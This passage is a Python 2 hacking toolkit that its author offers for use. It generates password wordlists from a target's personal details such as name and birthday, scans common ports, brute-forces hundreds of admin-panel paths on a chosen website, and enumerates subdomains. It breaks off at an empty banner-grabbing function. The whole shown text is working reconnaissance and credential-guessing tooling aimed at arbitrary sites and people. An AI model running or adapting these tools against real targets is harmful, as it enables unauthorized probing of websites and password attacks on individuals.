#Thanks for try my code.. hope you enjoy :)
#Follow my Instagram: @bgsrzk.py
#Stay tune for update :)
import socket
import os
import sys
from time import *
from string import *
from random import *
from re import findall
import httplib
from datetime import datetime
import itertools
try:
	import requests
except:
	os.system('clear')
	print('[!] You not installed requests..')
	print('Do "pip2 install requests"')
	sleep(3)
	os.system('clear')
	exit()
def passgen(target):
	print('\033[1;31;20m')
	os.system('figlet PassGen')
	print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
	scale = raw_input('\033[1;35;20m[#] Input size Pass [eg: "1 to 8" = 1-8]: ')
	start = int(scale.split('-')[0])
	final = int(scale.split('-')[1])

	use_nouse = raw_input("\033[1;35;20m[?] Do you want to add personal data ? [y/N]: ")
	if use_nouse == 'y':
		first_name = raw_input("\n\033[36m[*] First Name: ")
		last_name = raw_input("\n\033[36m[*] Last Name: ")
		birthday = raw_input("\n\033[36m[*] Birthday: ")
		month = raw_input("\n\033[36m[*] Month: ")
		year = raw_input("\n\033[36m[*] Year: ")
		chrs = first_name + last_name + birthday + month + year
	else:
		chrs = 'abcdefghijklmnopqrstuvwxyz'
		pass

	chrs_up = chrs.upper()
	chrs_specials = '!\][/?.,~-=";:><@#$%&*()_+\' '
	chrs_numerics = '1234567890'

	file_name = raw_input('\033[1;35;20m[#] Insert a name for your wordlist file(with .txt): ')
	arq = open(file_name, 'w')
	if raw_input('\033[1;35;20m[?] Do you want to add uppercase characters? (y/n): ') == 'y':
		chrs = ''.join([chrs, chrs_up])
	if raw_input('\033[1;35;20m[?] Do you want to add special characters? (y/n): ') == 'y':
		chrs = ''.join([chrs, chrs_specials])
	if raw_input('\033[1;35;20m[?] Do you want to add numeric characters? (y/n): ') == 'y':
		chrs = ''.join([chrs, chrs_numerics])
	print('\033[1;32;20m')
	for i in range(start, final+1):
		for j in itertools.product(chrs, repeat=i):
			temp = ''.join(j)
			print(temp)
			arq.write(temp + '\n')
	arq.close()
	print('\033[1;35;20m[*] Saving..')
	sleep(2)
	print('\033[1;35;20m[#] Saved to Current Directory..')
	sleep(3)
	main()
def scanner(host):
	socket.setdefaulttimeout(1)
	print ('[*] Scanning ' + host)
	host=socket.gethostbyname(host)
	print ('[*] IP of host: ' + host)
	ports=[1,5,7,18,20,21,22,23,25,43,42,53,80,109,110,115,118,443,194,161,445,156,137,139,3306]
	try:
		for port in ports:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex((host, port))
			if result == 0:
				print ('Port {}: \t Open'.format(port))
			sock.close()
    
	except KeyboardInterrupt:
		print ('You pressed Ctrl+C')
		main()

	except socket.gaierror:
		print ('Hostname could not be resolved. Exiting')
		main()

	except socket.error:
		print ("Couldn't connect to server")
		main()
	print('Scan End..')
	data = raw_input('Press [ENTER] to Continue..')
	if data == '':
		os.system('clear')
		main()
def findAdmin(target):
	try:
		var1 = 0
		var2 = 0

		php = ['admin/','administrator/','login.php','administration/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administrator/','instadmin/',
       'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','/login.aspx',
       'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
       'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
       'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
       'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
       'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
       'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
       'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
       'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
       'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
       'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
       'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
       'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
       'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
       'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
       'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
       'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
       'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
       'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
       'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
       'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
       'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
       'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
       'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
       'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
       'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
       'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
       'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
       'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
       'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
       'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
       'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
       'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
       'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
       'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
       'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
       'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
       'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
       'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
       'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
       'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
       'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
       'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
       'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
       'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
       'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
       'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
       'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
       'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','adminLogin/','admin_area/','panel-administracion/','instadmin/','login.aspx',
       'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
       'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
       'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
       'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
       'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
       'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
       'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
       'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
       'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
       'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
       'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
       'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
       'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
       'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
       'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
       'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
       'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx','memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
       'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
       'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
       'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
       'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
       'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
       'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
       'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
       'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
       'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
       'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
       'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
       'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
       'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
       'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
       'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
       'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
       'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
       'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
       'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
       'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
       'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
       'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
       'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
       'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
       'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
       'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
       'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
       'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
       'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
       'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi','admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
       'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
       'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
       'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
       'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
       'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
       'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
       'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
       'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
       'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
       'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
       'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
       'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
       'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
       'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
       'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
       'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf','cpanel','cpanel.php','cpanel.html']

		asp = ['admin/', 'administrator/', 'admin1/', 'admin2/', 'admin3/', 'admin4/', 'admin5/', 'moderator/', 'webadmin/',
       'adminarea/', 'bb-admin/', 'adminLogin/', 'admin_area/', 'panel-administracion/', 'instadmin/',
       'memberadmin/', 'administratorlogin/', 'adm/', 'account.asp', 'admin/account.asp', 'admin/index.asp',
       'admin/login.asp', 'admin/admin.asp',
       'admin_area/admin.asp', 'admin_area/login.asp', 'admin/account.html', 'admin/index.html', 'admin/login.html',
       'admin/admin.html',
       'admin_area/admin.html', 'admin_area/login.html', 'admin_area/index.html', 'admin_area/index.asp',
       'bb-admin/index.asp', 'bb-admin/login.asp', 'bb-admin/admin.asp',
       'bb-admin/index.html', 'bb-admin/login.html', 'bb-admin/admin.html', 'admin/home.html',
       'admin/controlpanel.html', 'admin.html', 'admin/cp.html', 'cp.html',
       'administrator/index.html', 'administrator/login.html', 'administrator/account.html', 'administrator.html',
       'login.html', 'modelsearch/login.html', 'moderator.html',
       'moderator/login.html', 'moderator/admin.html', 'account.html', 'controlpanel.html', 'admincontrol.html',
       'admin_login.html', 'panel-administracion/login.html',
       'admin/home.asp', 'admin/controlpanel.asp', 'admin.asp', 'pages/admin/admin-login.asp', 'admin/admin-login.asp',
       'admin-login.asp', 'admin/cp.asp', 'cp.asp',
       'administrator/account.asp', 'administrator.asp', 'acceso.asp', 'login.asp', 'modelsearch/login.asp',
       'moderator.asp', 'moderator/login.asp', 'administrator/login.asp',
       'moderator/admin.asp', 'controlpanel.asp', 'admin/account.html', 'adminpanel.html', 'webadmin.html',
       'pages/admin/admin-login.html', 'admin/admin-login.html',
       'webadmin/index.html', 'webadmin/admin.html', 'webadmin/login.html', 'user.asp', 'user.html',
       'admincp/index.asp', 'admincp/login.asp', 'admincp/index.html',
       'admin/adminLogin.html', 'adminLogin.html', 'admin/adminLogin.html', 'home.html', 'adminarea/index.html',
       'adminarea/admin.html', 'adminarea/login.html',
       'panel-administracion/index.html', 'panel-administracion/admin.html', 'modelsearch/index.html',
       'modelsearch/admin.html', 'admin/admin_login.html',
       'admincontrol/login.html', 'adm/index.html', 'adm.html', 'admincontrol.asp', 'admin/account.asp',
       'adminpanel.asp', 'webadmin.asp', 'webadmin/index.asp',
       'webadmin/admin.asp', 'webadmin/login.asp', 'admin/admin_login.asp', 'admin_login.asp',
       'panel-administracion/login.asp', 'adminLogin.asp',
       'admin/adminLogin.asp', 'home.asp', 'admin.asp', 'adminarea/index.asp', 'adminarea/admin.asp',
       'adminarea/login.asp', 'admin-login.html',
       'panel-administracion/index.asp', 'panel-administracion/admin.asp', 'modelsearch/index.asp',
       'modelsearch/admin.asp', 'administrator/index.asp',
       'admincontrol/login.asp', 'adm/admloginuser.asp', 'admloginuser.asp', 'admin2.asp', 'admin2/login.asp',
       'admin2/index.asp', 'adm/index.asp',
       'adm.asp', 'affiliate.asp', 'adm_auth.asp', 'memberadmin.asp', 'administratorlogin.asp', 'siteadmin/login.asp',
       'siteadmin/index.asp', 'siteadmin/login.html']

		js = ['admin/', 'administrator/', 'admin1/', 'admin2/', 'admin3/', 'admin4/', 'admin5/', 'usuarios/', 'usuario/',
      'administrator/', 'moderator/', 'webadmin/', 'adminarea/', 'bb-admin/', 'adminLogin/', 'admin_area/',
      'panel-administracion/', 'instadmin/',
      'memberadmin/', 'administratorlogin/', 'adm/', 'admin/account.js', 'admin/index.js', 'admin/login.js',
      'admin/admin.js', 'admin/account.js',
      'admin_area/admin.js', 'admin_area/login.js', 'siteadmin/login.js', 'siteadmin/index.js', 'siteadmin/login.html',
      'admin/account.html', 'admin/index.html', 'admin/login.html', 'admin/admin.html',
      'admin_area/index.js', 'bb-admin/index.js', 'bb-admin/login.js', 'bb-admin/admin.js', 'admin/home.js',
      'admin_area/login.html', 'admin_area/index.html',
      'admin/controlpanel.js', 'admin.js', 'admincp/index.asp', 'admincp/login.asp', 'admincp/index.html',
      'admin/account.html', 'adminpanel.html', 'webadmin.html',
      'webadmin/index.html', 'webadmin/admin.html', 'webadmin/login.html', 'admin/admin_login.html', 'admin_login.html',
      'panel-administracion/login.html',
      'admin/cp.js', 'cp.js', 'administrator/index.js', 'administrator/login.js', 'nsw/admin/login.js',
      'webadmin/login.js', 'admin/admin_login.js', 'admin_login.js',
      'administrator/account.js', 'administrator.js', 'admin_area/admin.html', 'pages/admin/admin-login.js',
      'admin/admin-login.js', 'admin-login.js',
      'bb-admin/index.html', 'bb-admin/login.html', 'bb-admin/admin.html', 'admin/home.html', 'login.js',
      'modelsearch/login.js', 'moderator.js', 'moderator/login.js',
      'moderator/admin.js', 'account.js', 'pages/admin/admin-login.html', 'admin/admin-login.html', 'admin-login.html',
      'controlpanel.js', 'admincontrol.js',
      'admin/adminLogin.html', 'adminLogin.html', 'admin/adminLogin.html', 'home.html', 'rcjakar/admin/login.js',
      'adminarea/index.html', 'adminarea/admin.html',
      'webadmin.js', 'webadmin/index.js', 'acceso.js', 'webadmin/admin.js', 'admin/controlpanel.html', 'admin.html',
      'admin/cp.html', 'cp.html', 'adminpanel.js', 'moderator.html',
      'administrator/index.html', 'administrator/login.html', 'user.html', 'administrator/account.html',
      'administrator.html', 'login.html', 'modelsearch/login.html',
      'moderator/login.html', 'adminarea/login.html', 'panel-administracion/index.html',
      'panel-administracion/admin.html', 'modelsearch/index.html', 'modelsearch/admin.html',
      'admincontrol/login.html', 'adm/index.html', 'adm.html', 'moderator/admin.html', 'user.js', 'account.html',
      'controlpanel.html', 'admincontrol.html',
      'panel-administracion/login.js', 'wp-login.js', 'adminLogin.js', 'admin/adminLogin.js', 'home.js', 'admin.js',
      'adminarea/index.js',
      'adminarea/admin.js', 'adminarea/login.js', 'panel-administracion/index.js', 'panel-administracion/admin.js',
      'modelsearch/index.js',
      'modelsearch/admin.js', 'admincontrol/login.js', 'adm/admloginuser.js', 'admloginuser.js', 'admin2.js',
      'admin2/login.js', 'admin2/index.js', 'usuarios/login.js',
      'adm/index.js', 'adm.js', 'affiliate.js', 'adm_auth.js', 'memberadmin.js', 'administratorlogin.js']

		try:
			print('\033[1;31;20m')
			os.system('figlet AdminPanel')
			print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
			site = raw_input('\033[1;32;20m[Admin Panel]\033[1;35;20mWeb Domain: \033[1;32;20m')
			site = site.replace('http://', '')
			print ('Checking website ' + site + '...')
			conn = httplib.HTTPConnection(site)
			conn.connect()
			print ('Server Ready!')
		except (httplib.HTTPResponse, socket.error) as Exit:
			raw_input('[!] Input Website..')
			exit()
		print ('Select Type Website: ')
		print ('\033[1;35;20m[1] PHP')
		print ('\033[1;35;20m[2] ASP')
		print ('\033[1;35;20m[3] JS\033[1;32;20m')
		print ('\nInput Number and [ENTER]: \n')
		code = input('>>> ')

		if code == 1:
			print('\t [#] Scanning ' + site + '...\n\n')
			for admin in php:
				admin = admin.replace('\n', '')
				admin = '/' + admin
				host = site + admin
				print ('[*] Checking ' + host + '...')
				connection = httplib.HTTPConnection(site)
				connection.request('GET', admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print ('%s %s' % ('\n\n[+]' + host, 'Found!'))
					raw_input('Continue? Press [ENTER]\n')
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print ('%s %s' % ('\n>>>' + host, 'Possible admin page (302 - Redirect)'))
				else:
					print ('%s %s %s' % (host, ' Interesting response:', response.status))
				connection.close()
			print('\n\nCompleted \n')
			print var1, 'Admin Page Found..'
			print var2, 'Total page Scanned'
			raw_input('Done! Press [ENTER] to Exit.. ')
			os.system('clear')
			main()
		if code == 2:
			print('[#] Scanning.. ' + site + '...\n\n')
			for admin in asp:
				admin = admin.replace('\n', '')
				admin = '/' + admin
				host = site + admin
				print ('[*] Checking ' + host + '...')
				connection = httplib.HTTPConnection(site)
				connection.request('GET', admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print ('%s %s' % ('\n\n[+]' + host, 'Found!'))
					raw_input('Continue? Press [ENTER]\n')
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print ('%s %s' % ('\n>>>' + host, 'Possible admin page (302 - Redirect)'))
				else:
					print ('%s %s %s' % (host, ' Interesting response:', response.status))
				connection.close()
			print('\n\nCompleted \n')
			print (var1, 'Admin Page Found..')
			print (var2, 'Total page Scanned')
			raw_input('Done! [ENTER] to Exit.. ')
			os.system('clear')
			main()
		if code == 3:
			print('[#] Scanning ' + site + '...\n\n')
			for admin in js:
				admin = admin.replace('\n', '')
				admin = '/' + admin
				host = site + admin
				print ('[*] Checking ' + host + '...')
				connection = httplib.HTTPConnection(site)
				connection.request('GET', admin)
				response = connection.getresponse()
				var2 = var2 + 1
				if response.status == 200:
					var1 = var1 + 1
					print ('%s %s' % ('\n\n[+]' + host, 'Found!'))
					raw_input('Continue? Press [ENTER]..\n')
				elif response.status == 404:
					var2 = var2
				elif response.status == 302:
					print ('%s %s' % ('\n>>>' + host, 'Possible admin page (302 - Redirect)'))
				else:
					print ('%s %s %s' % (host, ' Interesting response:', response.status))
				connection.close()
			print('\n\nCompleted \n')
			print (var1, 'Admin Page Found..')
			print (var2,'Total Page Scanned')
			raw_input('Done! [ENTER] to Exit..')
			os.system('clear')
			main()
	except (httplib.HTTPResponse, socket.error):
		print ('\n[!] ERROR: Check your Connection..')
	except KeyboardInterrupt:
		print ('\n[!] Canceled')
def Subdomain(target):
	print('[*] Scan Started..\n')
	sleep(3)
	response = requests.get('https://findsubdomains.com/subdomains-of/' + target).text
	sub = findall(r'(?s)<div class="domains js-domain-name">(.*?)</div>', response)
	print ('[+] Subdomain Results:\n')
	for i in range (len(sub)):
		subdo =  [str(sub[i])]
		subdom=map(str.strip,subdo)
		subdomain=''.join(subdom)
		subdomain[1:-1]
		print '\033[1;32;20m',subdomain
	sleep(3)
	data = raw_input('\nPress [ENTER] to Continue.. ')
	if data == '':
		os.system('clear')
		main()
def HTTPBanner(target):
